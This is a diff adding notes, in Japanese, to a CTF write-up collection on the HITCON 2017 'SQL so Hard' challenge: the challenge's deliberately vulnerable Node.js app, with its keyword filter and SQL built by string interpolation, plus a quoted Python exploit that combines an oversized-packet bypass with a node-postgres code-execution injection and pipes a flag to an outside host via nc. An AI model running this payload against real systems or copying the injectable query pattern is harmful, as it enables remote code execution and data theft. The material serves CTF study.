@@ -84,6 +84,179 @@ https://github.com/takabaya-shi/CTF-writeup/blob/master/HackTheBox/celestial/REA
 Vulnhubのtemple of doomでCelestialと同じの逆シリアライズの脆弱性がある。   
 https://github.com/takabaya-shi/CTF-writeup/tree/master/Vulnhub/temple%20of%20doom   
 
+## MySQL "max_allowed_packet"/ PostgreSQL RCE "pg@2.x ~ pg@7.1.0" / (hitcon2017 SQL so Hard)
+https://github.com/orangetw/My-CTF-Web-Challenges#sql-so-hard  
+https://github.com/sorgloomer/writeups/blob/master/writeups/2017-hitcon-quals/sql-so-hard.md  
+配布されるNode.jsの`app.js`は以下の通り。  
+hintとしてnode.jsのpostgresモジュールのRCEの脆弱性が与えられる。  
+https://node-postgres.com/announcements#2017-08-12-code-execution-vulnerability  
+`function waf(string) {`で禁止文字列を定義されてる。  
+`app.all("/*",`で入力したQueryとBodyをIPとともにMySQLのデータベースにブラックリストに登録。    
+つまり、このMySQLが実行されないようにしないといけない？  
+`app.post("/reg",`でPostgeSQLのデータベースに入力をサニタイジングなしにSQL構文を作成しているのでここでRCEできる！  
+```js
+#!/usr/bin/node
+
+/**
+ *  @HITCON CTF 2017
+ *  @Author Orange Tsai
+ */
+
+const qs = require("qs");
+const fs = require("fs");
+const pg = require("pg");
+const mysql = require("mysql");
+const crypto = require("crypto");
+const express = require("express");
+
+const pool = mysql.createPool({
+    connectionLimit: 100, 
+    host: "localhost",
+    user: "ban",
+    password: "ban",
+    database: "bandb",
+});
+
+const client = new pg.Client({
+    host: "localhost",
+    user: "userdb",
+    password: "userdb",
+    database: "userdb",
+});
+client.connect();
+
+const KEYWORDS = [
+    "select", 
+    "union", 
+    "and", 
+    "or", 
+    "\\", 
+    "/", 
+    "*", 
+    " " 
+]
+
+function waf(string) {
+    for (var i in KEYWORDS) {
+        var key = KEYWORDS[i];
+        if (string.toLowerCase().indexOf(key) !== -1) {
+            return true;
+        }
+    }
+    return false;
+}
+
+const app = express();
+app.use((req, res, next) => { // ミドルウェア関数を定義。はじめに呼ばれる
+   var data = "";
+   req.on("data", (chunk) => { data += chunk})
+   req.on("end", () =>{
+       req.body = qs.parse(data);  // 受信したデータ(QueryとBody)を解析して配列で保持
+       next();  // 次のミドルウェア関数を実行
+   })
+})
+
+
+app.all("/*", (req, res, next) => {  // 多分app.useのあとに実行される。/*のルーティングで実行
+    if ("show_source" in req.query) {
+        return res.end(fs.readFileSync(__filename));
+    }
+    if (req.path == "/") {
+        return next();
+    }
+
+    var ip = req.connection.remoteAddress;
+    var payload = "";
+    for (var k in req.query) {
+        if (waf(req.query[k])) {
+            payload = req.query[k];
+            break;
+        }
+    }
+    for (var k in req.body) {
+        if (waf(req.body[k])) {
+            payload = req.body[k];
+            break;
+        }
+    }
+
+    if (payload.length > 0) {  // MySQLでブラックリストに登録
+        var sql = `INSERT INTO blacklists(ip, payload) VALUES(?, ?) ON DUPLICATE KEY UPDATE payload=?`;
+    } else {
+        var sql = `SELECT ?,?,?`;
+    }
+    
+    return pool.query(sql, [ip, payload, payload], (err, rows) => {
+        var sql = `SELECT * FROM blacklists WHERE ip=?`;
+        return pool.query(sql, [ip], (err,rows) => {
+            if ( rows.length == 0) {
+                return next();
+            } else {
+                return res.end("Shame on you"); // ブラックリストに登録されていれば終了
+            }
+            
+        });
+    });
+
+});
+
+
+app.get("/", (req, res) => {
+    var sql = `SELECT * FROM blacklists GROUP BY ip`;
+    return pool.query(sql, [], (err,rows) => {
+        res.header("Content-Type", "text/html");
+        var html = "<pre>Here is the <a href=/?show_source=1>source</a>, thanks to Orange\n\n<h3>Hall of Shame</h3>(delete every 60s)\n";
+        for(var r in rows) {
+            html += `${parseInt(r)+1}. ${rows[r].ip}\n`;
+
+        }
+        return res.end(html);
+    });
+
+});
+
+app.post("/reg", (req, res) => {
+    var username = req.body.username;
+    var password = req.body.password;
+    if (!username || !password || username.length < 4 || password.length < 4) {
+        return res.end("Bye");
+    } 
+
+    password = crypto.createHash("md5").update(password).digest("hex");
+    var sql = `INSERT INTO users(username, password) VALUES('${username}', '${password}') ON CONFLICT (username) DO NOTHING`; // Postgresを実行
+    return client.query(sql.split(";")[0], (err, rows) => {
+        if (rows && rows.rowCount == 1) {
+            return res.end("Reg OK");
+        } else {
+            return res.end("User taken");
+        }
+    });
+});
+
+app.listen(31337, () => {
+    console.log("Listen OK");
+});
+```
+MySQLの`max_allowed_packet `では入力が大きすぎるとドロップして実行しないらしい。  
+WAFのバイパスはイマイチよくわかってない……  
+以下がExploitらしい。  
+```python
+from random import randint
+import requests
+
+# payload = "union"
+payload = """','')/*%s*/returning(1)as"\\'/*",(1)as"\\'*/-(a=`child_process`)/*",(2)as"\\'*/-(b=`/readflag|nc orange.tw 12345`)/*",(3)as"\\'*/-console.log(process.mainModule.require(a).exec(b))]=1//"--""" % (' '*1024*1024*16)
+
+
+username = str(randint(1, 65535))+str(randint(1, 65535))+str(randint(1, 65535))
+data = {
+            'username': username+payload, 
+                'password': 'AAAAAA'
+                }
+print 'ok'
+r = requests.post('http://13.113.21.59:31337/reg', data=data);
+print r.content
+```
 # サンプルアプリ
 ## progate
 プロゲートの無料のアプリ。
@@ -128,3 +301,5 @@ https://gist.github.com/mitsuruog/fc48397a8e80f051a145
 Nodejsの基本   
 https://developer.mozilla.org/ja/docs/Learn/Server-side/Express_Nodejs/Introduction   
 Node.jsの基本   
+https://qiita.com/ganariya/items/85e51e718e56e7d128b8  
+Node.jsの基本。わかりやすい。ミドルウェアとかのわかりやすい解説。  
